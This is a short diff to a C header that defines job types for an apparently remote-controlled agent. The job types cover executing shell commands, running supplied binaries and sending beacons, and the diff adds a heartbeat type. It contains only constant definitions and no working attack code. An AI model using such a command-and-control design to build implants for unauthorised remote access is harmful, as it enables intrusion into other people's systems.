@@ -30,6 +30,7 @@
 #define AGENT_EXECUTE_SHELLSCRIPT 5     // Agent executes a shell command. Data is string of command to execute
 #define AGENT_EXECUTE_BINARY 6          // Agent executes a provided binary. Data is described in `net_file` structure
 #define AGENT_SEND_BEACON 7             // Agent sends beacon information
+#define AGENT_HEARTBEAT 8               // Agent sends beacon to prove its alive
 
 
 // define response types for agent job statuses
